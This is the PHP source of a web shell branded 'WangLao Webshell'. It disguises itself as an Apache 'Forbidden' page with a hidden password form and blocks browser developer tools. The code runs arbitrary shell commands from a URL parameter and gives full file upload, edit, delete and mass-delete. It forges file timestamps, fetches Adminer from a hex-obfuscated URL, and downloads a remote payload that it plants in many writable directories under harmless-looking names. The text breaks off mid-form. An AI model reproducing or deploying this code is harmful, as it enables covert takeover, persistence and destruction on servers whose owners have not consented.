<?php
session_start();
date_default_timezone_set("Asia/Jakarta");


function show_login_page($message = "")
{
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <script src="/fold-sighnesse-double-our-Colour-fromisdome-Cloc" async></script>
        <title><?= $_SERVER['SERVER_NAME']; ?></title>
    </head>
    <body>
        <h1>Forbidden</h1>
        <h1 style="font-weight: normal; font-size: 18px;">You don't have permission to access this resource.</h1> 
        <hr>
        <?php

$server = $_SERVER['SERVER_SOFTWARE'];


$host = $_SERVER['SERVER_NAME'];


$port = $_SERVER['SERVER_PORT'];


$os = php_uname('s');  $release = php_uname('r');  

if (stripos($server, 'apache') !== false) {
         $distro = "(Linux)";
    if (file_exists('/etc/debian_version')) {
        $distro = "(Debian)";
    } elseif (file_exists('/etc/redhat-release')) {
        $distro = "(RedHat)";
    }
         echo "<i>Apache" . explode(" ", $server)[0] . " $distro Server at $host Port $port</i>";
} elseif (stripos($server, 'nginx') !== false) {
         echo "<i>$server (Linux) Server at $host Port $port</i>";
} elseif (stripos($server, 'microsoft-iis') !== false) {
         echo "<i>$server (Windows) Server at $host Port $port</i>";
} else {
         echo "<i>$server ($os) Server at $host Port $port</i>";
}
?>
        <form action="" method="post" style="display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #2e313d; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);">
            <input type="password" name="pass" placeholder="Password" autofocus style="border: none; border-bottom: 1px solid #fff; padding: 5px; margin-bottom: 10px; color: #fff; background: none;">
            <input type="submit" name="submit" value=">" style="border: none; padding: 5px 20px; background-color: #FF2E04; color: #fff; cursor: pointer;">
        </form>
        <script type="text/javascript">
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            }, false);

            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
                    e.preventDefault();
                }
                if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
                    e.preventDefault();
                }
                if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
                    e.preventDefault();
                }
                if (e.ctrlKey && (e.key === 'a' || e.key === 'A')) {
                    e.preventDefault();
                }
                if (e.key === 'F12') {
                    e.preventDefault();
                }
            }, false);

            document.addEventListener('keydown', function(e) {
                if (e.shiftKey && e.key === 'L') {
                    e.preventDefault();                       var form = document.querySelector('form');
                    form.style.display = 'block';
                    var passwordInput = document.querySelector('form input[type="password"]');
                    passwordInput.focus();
                }
            }, false);
        </script>
    </body>
    </html>
    <?php
    exit;
}

if (isset($_GET['cmd'])) {
    $cmd = escapeshellcmd($_GET['cmd']);      $handle = popen($cmd, 'r');      $output = fread($handle, 2096);      pclose($handle);  }


if (isset($_GET['logout'])) {
         session_unset();
    session_destroy();
    
         header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}


if (!isset($_SESSION['authenticated'])) {
         $stored_hashed_password = '$2y$10$a1K97JAkJsMzE/YpDkcYYOvJ4TEB7B99pXIYj5/H0E8EAamXznnOW';  
         if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
                 $_SESSION['authenticated'] = true;

                 $_SESSION['FM_SESSION_ID']['password_plaintext'] = $_POST['pass'];
    } else {
                 show_login_page("Password salah");
    }
}


function openGateway() {
    echo '<pre>';
    echo 'Anda sudah login!';
    echo '</pre>';
}
?>

<?php 

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

header("X-XSS-Protection: 0"); 
ob_start(); 
set_time_limit(0); 
error_reporting(0); 
ini_set('display_errors', FALSE); 

if (!isset($_SESSION['home_directory'])) {
    $_SESSION['home_directory'] = __DIR__;
}

$home_directory = $_SESSION['home_directory'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $_SERVER['SERVER_NAME']; ?></title>
    
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>

body {
    font-family: 'Ubuntu Mono', monospace; background-color: #181818; color: #f0f0f0; margin: 0; padding: 20px;
}


.container {
    max-width: 90%; padding: 30px; border-radius: 15px; box-shadow: 0px 6px 20px rgba(0, 0, 0, 0.6); 
    background-color: #252525; margin: 0 auto; border: 1px solid #333;
}


.path-navigation {
    margin-bottom: 25px; padding: 15px; background-color: #333; border-radius: 8px; font-size: 1.1em;
}
.path-navigation a {
    color:rgb(238, 255, 0); text-decoration: none; font-weight: bold; transition: color 0.3s, text-shadow 0.3s;
}
.path-navigation a:hover {
    color:rgba(141, 141, 135, 0.19); text-shadow: 0px 0px 5px rgb(255, 255, 255);
}


table {
    width: 100%; border-collapse: collapse; margin-bottom: 25px;
}
th, td {
    padding: 5px; text-align: left; border-bottom: 1px solid #444; color: #f0f0f0; transition: background-color 0.3s ease, transform 0.2s;
}
th { background-color: #333; font-weight: 600; }
td { background-color: #252525; }
tr:hover td { background-color: #1e1e1e; transform: scale(1.01); }


.action-container {
    display: flex; justify-content: space-between; margin-bottom: 25px; gap: 25px; flex-wrap: wrap;
}
.action {
    flex: 1; min-width: 300px;
}
input[type="file"], input[type="text"], textarea {
    width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #555; 
    background-color: #1c1c1c; color: #f0f0f0; border-radius: 8px;
}
input[type="submit"] {
    background-color: #1e90ff; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; 
    font-weight: bold; transition: background-color 0.3s ease, box-shadow 0.3s ease;
}
input[type="submit"]:hover {
    background-color: #6495ed; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
}


.edit-form {
    margin-top: 25px; background-color: #2e2e2e; padding: 20px; border-radius: 10px; border: 1px solid #444;
}


.action-icons a {
    margin: 0 10px; text-decoration: none; color: #f0f0f0; font-size: 20px; position: relative; 
    transition: color 0.3s ease, transform 0.3s ease;
}
.action-icons a:hover {
    color: #1e90ff; transform: scale(1.2);
}


.action-icons a::after {
    content: attr(data-tooltip); position: absolute; background-color: #333; color: #f0f0f0; padding: 5px; 
    border-radius: 5px; top: -30px; left: 50%; transform: translateX(-50%); white-space: nowrap; font-size: 12px; display: none;
}
.action-icons a:hover::after { display: block; }


table td a {
    color: #f0a500; 
}
table td a:hover {
    color: #ffd700; 
    text-decoration: underline;
}


.icon {
    display: inline-block; margin-right: 10px; 
}

.logo-text {
    font-family: 'Orbitron', sans-serif;
    font-size: 3.5rem;
    font-weight: bold;
    color: #e0e0e0; 
    background: linear-gradient(90deg, #ffffff, #c0c0c0, #808080, #c0c0c0, #ffffff);
    background-clip: text;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
    margin: 0;
}


button, input[type="submit"], .btn {
    background-color: #000; 
    color: white; 
    padding: 10px 20px; 
    border: none; 
    border-radius: 8px; 
    cursor: pointer; 
    font-weight: bold; 
    font-size: 12px; 
    box-shadow: 0 4px #333; 
    transition: all 0.2s ease; 
    position: relative; 
}


button:hover, input[type="submit"]:hover, .btn:hover {
    box-shadow: 0 6px #222; 
    transform: translateY(-2px); 
}


button:active, input[type="submit"]:active, .btn:active {
    box-shadow: 0 2px #444; 
    transform: translateY(2px); 
}


button i, input[type="submit"] i, .btn i {
    margin-right: 10px; 
}

.forbidden {
        position: relative;
        cursor: not-allowed; 
    }

    .forbidden::after {
        content: '\f05e'; 
        font-family: "Font Awesome 5 Free"; 
        font-weight: 900; 
        color: red; 
        font-size: 20px; 
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        opacity: 0; 
        pointer-events: none;
    }

    .forbidden:hover::after {
        opacity: 1; 
    }


.footer {
    text-align: center; padding: 10px; background-color: #333; color: #f0f0f0; font-size: 0.9em; margin-top: 20px; 
    border-top: 1px solid #444; border-radius: 0 0 15px 15px; box-shadow: 0px -3px 6px rgba(0, 0, 0, 0.2);
}
.footer p { margin: 0; }

</style>
</head>
<body>
<div class="container">

<div class="logo-container" style="display: flex; justify-content: center; align-items: center; text-align: center; margin-bottom: 20px; width: 100%; max-width: 900px; margin-left: auto; margin-right: auto;">
    <h1 class="logo-text">WangLao Webshell</h1>
</div>

<div class="button-container" style="display: flex; justify-content: center; align-items: center; gap: 20px; margin-bottom: 20px;">
    
    <a href="?j=<?php echo $home_directory; ?>" class="btn">
        <i class="fas fa-home" style="margin-right: 10px;"></i>Home File
    </a>

    
    <button onclick="toggleCommandContainer(true)" class="btn">
        <i class="fas fa-terminal" style="margin-right: 10px;"></i>Run CMD
    </button>

    <button onclick="showBackupForm()" class="btn">
        <i class="fas fa-file-upload" style="margin-right: 10px;"></i>Backup Files
    </button>

    <form method="get" action="" style="margin: 0; display: inline;">
        <input type="hidden" name="adminer" value="true">
        <input type="hidden" name="j" value="<?php echo htmlspecialchars($_GET['j'] ?? realpath(__DIR__)); ?>">
        <button type="submit" class="btn">
            <i class="fas fa-download" style="margin-right: 10px;"></i> Adminer
        </button>
    </form>

    <button onclick="toggleCommandHelp()" class="btn">
        <i class="fa-solid fa-users" style="margin-right: 10px;"></i>WangLao Team
    </button>

    <form method="get" action="" style="margin: 0; display: inline;">
    <button type="button" class="btn forbidden" onclick="return false;">
        <i class="fa-solid fa-biohazard" style="margin-right: 10px;"></i>Mass Deface
    </button>
    </form>

    <button onclick="deleteMassive()" class="btn">
        <i class="fas fa-trash" style="margin-right: 10px;"></i>Delete Massive
    </button>
</div>

    <?php
         if (isset($_SESSION['notification'])) {
        $notification = $_SESSION['notification'];
        echo "<script>
            Swal.fire({
                icon: '{$notification['type']}',
                title: '{$notification['title']}',
                text: '{$notification['text']}'
            });
        </script>";
        unset($_SESSION['notification']);      }
    
         function formatSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB'];
        for ($i = 0; $i < count($units) && $bytes >= 1024; $i++) {
            $bytes /= 1024;
        }
        return round($bytes, 2) . ' ' . $units[$i];
    }

         if (isset($_POST['upload'])) {
        $current_dir = isset($_GET['j']) ? $_GET['j'] : getcwd();
        $current_dir = rtrim(realpath($current_dir), '/') . '/';
        
        if (!is_writable($current_dir)) {
            $_SESSION['notification'] = ['type' => 'error', 'title' => 'Upload Gagal!', 'text' => 'Direktori tidak dapat ditulis.'];
            header("Location: ?j=" . htmlspecialchars($current_dir));
            exit;
        }
    
        $target_file = $current_dir . basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
            $_SESSION['notification'] = ['type' => 'success', 'title' => 'Upload Berhasil!', 'text' => "File berhasil diupload ke: $target_file"];
        } else {
            $_SESSION['notification'] = ['type' => 'error', 'title' => 'Upload Gagal!', 'text' => 'File gagal diupload.'];
        }
        header("Location: ?j=" . htmlspecialchars($current_dir));
        exit;
    }

    if (isset($_GET['action']) && $_GET['action'] === 'delete_massive') {
        header('Content-Type: application/json');          
        $input = json_decode(file_get_contents('php://input'), true);          
                 if (empty($input['selected_items']) || !is_array($input['selected_items'])) {
            echo json_encode([
                'success' => false,
                'message' => 'No files selected for deletion.'
            ]);
            exit;
        }
    
        $deleted_count = 0;      
        foreach ($input['selected_items'] as $item) {
            $real_path = realpath($item);              
            if ($real_path !== false && strpos($real_path, __DIR__) === 0) {
                                 if (is_file($real_path)) {
                    if (@unlink($real_path)) {
                        $deleted_count++;
                    }
                }
                                 elseif (is_dir($real_path)) {
                    if (@rmdir($real_path)) {
                        $deleted_count++;
                    }
                }
            }
        }
    
                 echo json_encode([
            'success' => true,
            'deleted_count' => $deleted_count
        ]);
        exit;
    }    

    if ($real_path !== false && strpos($real_path, __DIR__) === 0 && is_writable($real_path)) {
        if (is_file($real_path)) {
            if (@unlink($real_path)) {
                $deleted_count++;
            } else {
                $errors[] = $real_path;
            }
        }
    }
    
    
         if (isset($_GET['delete'])) {
        $file_to_delete = $_GET['delete'];
        $real_path = realpath($file_to_delete);
    
        if ($real_path !== false && strpos($real_path, __DIR__) === 0) {
            if (is_file($real_path)) {
                if (@unlink($real_path)) {
                    $_SESSION['notification'] = [
                        'type' => 'success',
                        'title' => 'File Deleted!',
                        'text' => 'File successfully deleted.'
                    ];
                } else {
                    $_SESSION['notification'] = [
                        'type' => 'error',
                        'title' => 'Delete Failed!',
                        'text' => 'Failed to delete the file.'
                    ];
                }
            }
        }
    
        header("Location: ?j=" . htmlspecialchars(dirname($real_path)));
        exit;
    }       

         if (isset($_POST['rename'])) {
        $old_name = $_POST['old_name'];
        $new_name = $_POST['new_name'];
        if (file_exists($old_name)) {
            if (rename($old_name, dirname($old_name) . '/' . $new_name)) {
                $_SESSION['notification'] = ['type' => 'success', 'title' => 'Rename Berhasil!', 'text' => 'Nama file atau folder berhasil diubah.'];
            } else {
                $_SESSION['notification'] = ['type' => 'error', 'title' => 'Rename Gagal!', 'text' => 'Nama file atau folder gagal diubah.'];
            }
        } else {
            $_SESSION['notification'] = ['type' => 'error', 'title' => 'File Tidak Ditemukan!', 'text' => 'File atau folder tidak ditemukan.'];
        }
        header("Location: ?j=" . htmlspecialchars(dirname($old_name)));
        exit;
    }
    
    if (isset($_POST['change_date'])) {
        $file_to_touch = $_POST['touch_file'];
        $new_date = $_POST['new_date'];
        
                 $timestamp = strtotime($new_date);
        if ($timestamp === false) {
            $_SESSION['notification'] = [
                'type' => 'error',
                'title' => 'Invalid Date!',
                'text' => 'Please enter a valid date format (YYYY-MM-DD HH:MM:SS).'
            ];
        } elseif (!file_exists($file_to_touch)) {
            $_SESSION['notification'] = [
                'type' => 'error',
                'title' => 'Path Not Found!',
                'text' => 'The file or folder does not exist.'
            ];
        } else {
                         if (touch($file_to_touch, $timestamp)) {
                $_SESSION['notification'] = [
                    'type' => 'success',
                    'title' => 'Date Changed!',
                    'text' => 'Last modification date has been updated for ' . (is_dir($file_to_touch) ? 'folder' : 'file') . '.'
                ];
            } else {
                $_SESSION['notification'] = [
                    'type' => 'error',
                    'title' => 'Change Failed!',
                    'text' => 'Failed to update last modification date for ' . (is_dir($file_to_touch) ? 'folder' : 'file') . '.'
                ];
            }
        }
        header("Location: ?j=" . htmlspecialchars(dirname($file_to_touch)));
        exit;
    }        

         if (isset($_POST['create_file'])) {
        $file_name = $_GET['j'] . '/' . $_POST['new_file'];
        if (file_put_contents($file_name, '') !== false) {
            $_SESSION['notification'] = ['type' => 'success', 'title' => 'File Baru Berhasil!', 'text' => 'File baru berhasil dibuat.'];
        } else {
            $_SESSION['notification'] = ['type' => 'error', 'title' => 'File Baru Gagal!', 'text' => 'File baru gagal dibuat.'];
        }
        header("Location: ?j=" . htmlspecialchars($_GET['j']));
        exit;
    }

         if (isset($_POST['create_folder'])) {
        $folder_name = $_GET['j'] . '/' . $_POST['new_folder'];
        if (mkdir($folder_name)) {
            $_SESSION['notification'] = ['type' => 'success', 'title' => 'Folder Baru Berhasil!', 'text' => 'Folder baru berhasil dibuat.'];
        } else {
            $_SESSION['notification'] = ['type' => 'error', 'title' => 'Folder Baru Gagal!', 'text' => 'Folder baru gagal dibuat.'];
        }
        header("Location: ?j=" . htmlspecialchars($_GET['j']));
        exit;
    }

             if (isset($_GET['download'])) {
            $file_to_download = $_GET['download'];
            if (file_exists($file_to_download) && is_file($file_to_download)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
                header('Content-Length: ' . filesize($file_to_download));
                readfile($file_to_download);
                exit;
            } else {
                $_SESSION['notification'] = [
                    'type' => 'error',
                    'title' => 'Download Gagal!',
                    'text' => 'File tidak ditemukan.'
                ];
                header('Location: ?j=' . htmlspecialchars(dirname($file_to_download)));
                exit;
            }
        }

                 if (isset($_GET['zip'])) {
            $folder_to_zip = $_GET['zip'];
            $zip_name = $folder_to_zip . '.zip';

            $zip = new ZipArchive();
            if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder_to_zip, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($iterator as $file) {
                    $zip->addFile($file, substr($file, strlen($folder_to_zip) + 1));
                }
                $zip->close();

                $_SESSION['notification'] = [
                    'type' => 'success',
                    'title' => 'ZIP Berhasil!',
                    'text' => 'Folder berhasil diarsipkan: ' . $zip_name
                ];
            } else {
                $_SESSION['notification'] = [
                    'type' => 'error',
                    'title' => 'ZIP Gagal!',
                    'text' => 'Gagal membuat arsip ZIP.'
                ];
            }
            header('Location: ?j=' . htmlspecialchars(dirname($folder_to_zip)));
            exit;
        }

         if (isset($_SESSION['notification'])) {
        $notification = $_SESSION['notification'];
        echo "<script>
            Swal.fire({
                icon: '{$notification['type']}',
                title: '{$notification['title']}',
                text: '{$notification['text']}'
            });
        </script>";
        unset($_SESSION['notification']);      }

    if (isset($_GET['adminer'])) {
                 $current_dir = isset($_GET['j']) ? realpath($_GET['j']) : __DIR__;
    
                 $previous_url = '?j=' . urlencode($_GET['j'] ?? realpath(__DIR__));
    
                 if ($current_dir && is_dir($current_dir) && is_writable($current_dir)) {
            $adminer_path = $current_dir . '/adminer.php';
            $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    
                         if (!file_exists($adminer_path)) {
                $content = file_get_contents($URL);                  if ($content !== false) {
                    $result = file_put_contents($adminer_path, $content);                      if ($result !== false) {
                        echo "<script>
                            Swal.fire({
                                icon: 'success',
                                title: 'Berhasil!',
                                text: 'Adminer berhasil diunduh ke: $adminer_path.',
                                confirmButtonText: 'Tutup'
                            }).then(() => {
                                const params = new URLSearchParams(window.location.search);
                                params.delete('adminer');
                                window.history.replaceState({}, '', window.location.pathname + '?' + params.toString());
                            });
                        </script>";
                    } else {
                        echo "<script>
                            Swal.fire({
                                icon: 'error',
                                title: 'Gagal!',
                                text: 'Gagal menyimpan Adminer ke: $adminer_path. Periksa izin folder.',
                                confirmButtonText: 'Tutup'
                            });
                        </script>";
                    }
                } else {
                    echo "<script>
                        Swal.fire({
                            icon: 'error',
                            title: 'Gagal!',
                            text: 'Gagal mengunduh Adminer. Periksa koneksi internet atau URL.',
                            confirmButtonText: 'Tutup'
                        });
                    </script>";
                }
            } else {
                echo "<script>
                    Swal.fire({
                        icon: 'info',
                        title: 'Sudah Tersedia',
                        text: 'Adminer sudah tersedia di: $adminer_path.',
                        confirmButtonText: 'Tutup'
                    });
                </script>";
            }
        } else {
            echo "<script>
                Swal.fire({
                    icon: 'error',
                    title: 'Gagal!',
                    text: 'Direktori target tidak valid atau tidak dapat ditulis: $current_dir.',
                    confirmButtonText: 'Tutup'
                });
            </script>";
        }
    }    

    if (isset($_POST['execute_backup'])) {
        $current_dir = isset($_GET['j']) ? realpath($_GET['j']) : __DIR__;
        $num_files = intval($_POST['num_files']);
        auto_backup_multiple($current_dir, $num_files, 'https://raw.githubusercontent.com/X-3nCrypt/antiquac/refs/heads/main/antiquack', 'backup');
    }

    function auto_backup_multiple($current_dir, $num_files = 1, $sourceUrl = '', $default_file_names = ['functions.php', 'config.php', 'data.php']) {
                 if (!$current_dir || !is_dir($current_dir) || !is_writable($current_dir)) {
            echo "<script>
                Swal.fire({
                    icon: 'error',
                    title: 'Gagal!',
                    text: 'Direktori target tidak valid atau tidak dapat ditulis.',
                    confirmButtonText: 'Tutup'
                });
            </script>";
            return;
        }
    
                 $downloaded_content = fetch_remote_file($sourceUrl);
        if (!$downloaded_content) {
            echo "<script>
                Swal.fire({
                    icon: 'error',
                    title: 'Gagal!',
                    text: 'Gagal mengunduh konten file dari $sourceUrl.',
                    confirmButtonText: 'Tutup'
                });
            </script>";
            return;
        }
    
                 $target_dirs = find_target_directories($current_dir);
    
        if (empty($target_dirs)) {
            echo "<script>
                Swal.fire({
                    icon: 'error',
                    title: 'Gagal!',
                    text: 'Tidak ditemukan direktori target yang sesuai.',
                    confirmButtonText: 'Tutup'
                });
            </script>";
            return;
        }
    
                 usort($target_dirs, function($a, $b) {
            return substr_count($b, DIRECTORY_SEPARATOR) - substr_count($a, DIRECTORY_SEPARATOR);
        });
    
        $files_added = 0;
        $success_files = [];      
        foreach ($target_dirs as $target_dir) {
            if ($files_added >= $num_files) break;
    
                         $folder_name = basename($target_dir);
            $base_file_name = preg_replace('/[^a-zA-Z0-9]/', '', strtolower($folder_name)) . '.php';              if (empty($folder_name) || $base_file_name === '.php') {
                $base_file_name = $default_file_names[array_rand($default_file_names)];              }
    
                         $file_name = $base_file_name;
            $counter = 1;
            while (file_exists(rtrim($target_dir, '/') . '/' . $file_name)) {
                $file_name = pathinfo($base_file_name, PATHINFO_FILENAME) . '_' . $counter . '.php';
                $counter++;
            }
    
            $file_path = rtrim($target_dir, '/') . '/' . $file_name;
    
                         if (file_put_contents($file_path, $downloaded_content)) {
                $success_files[] = $file_path;                  $files_added++;
            }
        }
    
                 if (!empty($success_files)) {
            $file_list = implode('<br>', $success_files);              echo "<script>
                Swal.fire({
                    icon: 'success',
                    title: 'Berhasil!',
                    html: 'File berhasil dipasang di lokasi berikut:<br>$file_list',
                    confirmButtonText: 'Tutup'
                });
            </script>";
        }
    
                 if ($files_added < $num_files) {
            echo "<script>
                Swal.fire({
                    icon: 'info',
                    title: 'Info',
                    text: 'Hanya berhasil memasang $files_added file dari $num_files yang diminta.',
                    confirmButtonText: 'Tutup'
                });
            </script>";
        }
    }      
    
    function fetch_remote_file($url) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }

    function find_target_directories($current_dir) {
        $directories = [];
        $directory_iterator = new RecursiveDirectoryIterator($current_dir, RecursiveDirectoryIterator::SKIP_DOTS);
        $iterator = new RecursiveIteratorIterator($directory_iterator, RecursiveIteratorIterator::CHILD_FIRST);
    
        foreach ($iterator as $path) {
            if ($path->isDir() && is_writable($path->getPathname())) {
                $directories[] = $path->getPathname();
            }
        }
    
        shuffle($directories);
        return $directories;
    }    

         $j = isset($_GET['j']) ? $_GET['j'] : getcwd();
    $j = str_replace('\\', '/', $j);
    $paths = explode('/', $j);

         echo '<div class="path-navigation">';
    echo '<a href="?j=/"><img src="https://i.pinimg.com/originals/be/be/fd/bebefd1f9715745ac0bcfcf443d728b2.gif" style="width: 50px; height: 50px; vertical-align: middle;"></a> / ';
    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) continue;
        echo '<a href="?j=';
        for ($i = 0; $i <= $id; $i++) {
            echo "$paths[$i]";
            if ($i != $id) echo "/";
        }
        echo '">' . htmlspecialchars($pat) . '</a>/';
    }
    echo '</div>';

         echo '<div class="action-container">';
    echo '<form class="action" action="" method="post" enctype="multipart/form-data">
            <label>Upload File:</label>
            <input type="file" name="fileToUpload" required>
            <input type="submit" name="upload" value="Upload File">
          </form>';
    echo '<form class="action" action="" method="post">
            <label>Create Folder:</label>
            <input type="text" name="new_folder" placeholder="New folder name">
            <input type="submit" name="create_folder" value="Create Folder">
          </form>';
    echo '<form class="action" action="" method="post">
            <label>Create File:</label>
            <input type="text" name="new_file" placeholder="New file name">
            <input type="submit" name="create_file" value="Create File">
          </form>';
    echo '</div>';

         echo '<table>';
    echo '<tr>
        <th>Directory/File</th>
        <th>Size</th>
        <th>Last Modification</th>
        <th>Permissions</th>
        <th>Action</th>
      </tr>';

          $scandir = scandir($j);

           foreach ($scandir as $file) {
    if ($file == '.' || $file == '..') continue;
    $full_path = "$j/$file";

             if (is_dir($full_path)) {
            $last_modification = date("Y-m-d H:i:s", filemtime($full_path));              echo '<tr>';
            echo '<td><span class="icon"><i class="fas fa-folder"></i></span><a href="?j=' . htmlspecialchars($full_path) . '">' . htmlspecialchars($file) . '</a></td>';
            echo '<td>-</td>';              echo '<td>' . $last_modification . '</td>';
            echo '<td>' . substr(sprintf('%o', fileperms($full_path)), -4) . '</td>';
            echo '<td class="action-icons">
                    <a href="#" onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Rename"><i class="fa-solid fa-pen"></i></a>
                    <a href="#" onclick="confirmDelete(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Delete"><i class="fas fa-trash"></i></a>
                    <a href="#" onclick="showTouchForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Change Date"><i class="fas fa-calendar-alt"></i></a>
                    <a href="?zip=' . htmlspecialchars($full_path) . '" data-tooltip="Zip Folder"><i class="fas fa-file-archive"></i></a>
                </td>';
            echo '</tr>';
        }
    }


foreach ($scandir as $file) {
    if ($file == '.' || $file == '..') continue;
    $full_path = "$j/$file";

         if (!is_dir($full_path)) {
        $size = formatSize(filesize($full_path));          $permissions = substr(sprintf('%o', fileperms($full_path)), -4);
        $last_modification = date("Y-m-d H:i:s", filemtime($full_path));          $file_info = pathinfo($file);

                 $icon = '<i class="fas fa-file"></i>';          if (isset($file_info['extension'])) {
            $ext = strtolower($file_info['extension']);
            if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) {
                $icon = '<i class="fas fa-file-image"></i>';
            } elseif (in_array($ext, ['mp4', 'mkv', 'avi', 'mov'])) {
                $icon = '<i class="fas fa-file-video"></i>';
            } elseif (in_array($ext, ['mp3', 'wav', 'ogg'])) {
                $icon = '<i class="fas fa-file-audio"></i>';
            } elseif (in_array($ext, ['zip', 'rar', '7z', 'tar', 'gz'])) {
                $icon = '<i class="fas fa-file-archive"></i>';
            } elseif (in_array($ext, ['doc', 'docx', 'odt'])) {
                $icon = '<i class="fas fa-file-word"></i>';
            } elseif (in_array($ext, ['xls', 'xlsx', 'ods'])) {
                $icon = '<i class="fas fa-file-excel"></i>';
            } elseif (in_array($ext, ['ppt', 'pptx', 'odp'])) {
                $icon = '<i class="fas fa-file-powerpoint"></i>';
            } elseif (in_array($ext, ['pdf'])) {
                $icon = '<i class="fas fa-file-pdf"></i>';
            } elseif (in_array($ext, ['txt', 'log', 'md'])) {
                $icon = '<i class="fas fa-file-alt"></i>';
            } elseif (in_array($ext, ['php', 'html', 'css', 'js', 'py', 'java', 'c', 'cpp'])) {
                $icon = '<i class="fas fa-file-code"></i>';
            }
        }

        echo '<tr>';
        echo '<td><input type="checkbox" name="selected_items[]" value="' . htmlspecialchars($full_path) . '" style="margin-right: 10px;">
                <span class="icon">' . $icon . '</span>' . htmlspecialchars($file) . '</td>';
        echo '<td>' . $size . '</td>';
        echo '<td>' . $last_modification . '</td>';
        echo '<td>' . $permissions . '</td>';
        echo '<td class="action-icons">
                <a href="?edit=' . htmlspecialchars($full_path) . '" data-tooltip="Edit"><i class="fas fa-edit"></i></a>
                <a href="#" onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Rename"><i class="fa-solid fa-pen"></i></a>
                <a href="#" onclick="confirmDelete(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Delete"><i class="fas fa-trash"></i></a>
                <a href="#" onclick="showTouchForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Change Date"><i class="fas fa-calendar-alt"></i></a>
                <a href="?download=' . htmlspecialchars($full_path) . '" data-tooltip="Download File"><i class="fas fa-download"></i></a>
              </td>';
        echo '</tr>';
    }
}     

                 if (isset($_GET['edit'])) {
            $file_to_edit = $_GET['edit'];
            if (file_exists($file_to_edit)) {
                $content = file_get_contents($file_to_edit);
                echo '<form action="" method="post">
                        <textarea name="file_content" rows="10" cols="50" style="width: 100%; box-sizing: border-box;">' . htmlspecialchars($content) . '</textarea>
                        <input type="hidden" name="file_to_edit" value="' . htmlspecialchars($file_to_edit) . '">
                        <input type="submit" name="save_edit" value="Save Changes" class="btn">
                        <a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">
                            <button type="button" class="btn">Back</button>
                        </a>
                      </form>';
            } else {
                echo "<script>
                        Swal.fire({
                            icon: 'error',
                            title: 'File Not Found',
                            text: 'The file you are trying to edit does not exist.'
                        }).then(() => {
                            window.location.href = '?j=" . htmlspecialchars(dirname($file_to_edit)) . "';
                        });
                      </script>";
            }
        }        

                 if (isset($_POST['save_edit'])) {
            $file_to_edit = $_POST['file_to_edit'];
            $file_content = $_POST['file_content'];
            if (file_put_contents($file_to_edit, $file_content) !== false) {
                echo "<script>
                        Swal.fire({
                            icon: 'success',
                            title: 'Success',
                            text: 'File saved successfully.'
                        }).then(() => {
                            window.location.href = '?j=" . htmlspecialchars(dirname($file_to_edit)) . "';
                        });
                    </script>";
            } else {
                echo "<script>
                        Swal.fire({
                            icon: 'error',
                            title: 'Failed',
                            text: 'Failed to save file.'
                        });
                    </script>";
            }
        }    
    ?>
    
    <div id="command-container" style="display: none; margin-bottom: 20px; background-color: #252525; padding: 20px; border-radius: 8px;">
        <h3 style="color: #f0f0f0;">Execute Command</h3>
        <form action="" method="get">
            <label for="cmd" style="color: #f0f0f0;">Command:</label>
